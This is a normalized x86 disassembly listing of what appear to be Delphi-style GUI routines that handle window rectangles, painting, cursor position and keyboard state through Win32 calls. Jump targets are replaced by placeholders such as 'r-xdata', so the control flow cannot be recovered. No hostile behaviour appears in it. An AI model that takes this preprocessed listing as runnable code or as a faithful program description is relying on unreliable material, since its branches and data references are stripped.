call sub_4185b0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4497c0
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a268
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_450a20
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4497c0
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45071c
push eax
call InvalidateRect
push ebp
call sub_44a1dc
pop ecx
test al al
je r-xdata
mov al 0x1
sub_44a304
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_460ae8
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_44afd4
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403350
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a368
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_450a20
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45071c
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_44a441
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44e528
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45071c
push eax
call ReleaseDC
retn
sub_44a4c8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax edi
call sub_44b008
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_449964
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b44
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_44afd4
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_448170
sub_44a59c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_44a5d8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_44a624
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_44a650
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_449dc4
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_449db0
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_40293c
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_40293c
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_45071c
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_44a734
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_44a780
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403350
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403350
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_44a844
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_44a890
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_44a8dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44a9f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_424828
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a9fe
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_44aa30
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_449964
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403304
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403350
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403350
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403350
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403350
jmp r-xdata
sub_44ab20
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416efc
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_44b008
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_449db0
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_449dc4
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_416f4c
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44ad00
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_449938
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403350
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_45071c
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_447534
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44aceb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_45071c
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_45071c
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403350
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403154
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4497c0
test esi esi
je r-xdata
sub_44ad00
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403350
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_44bb84
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403350
mov eax esi
call sub_449868
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_449824
mov ecx eax
xor edx edx
xor eax eax
call sub_416f24
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403350
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_44ada4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_44add4
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_44ae40
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_44af00
sub_44ae70
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_44aea0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_449964
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44aecc
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_44af00
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_44afd4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44b008
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_44b0a0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_460ae8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_460ae8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_4499c0
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46a294
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403350
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_460a2c
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403350
jmp r-xdata
sub_44b234
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408938
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408964
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_4499c0
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_40877c
call sub_408718
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408718
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_44b2dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
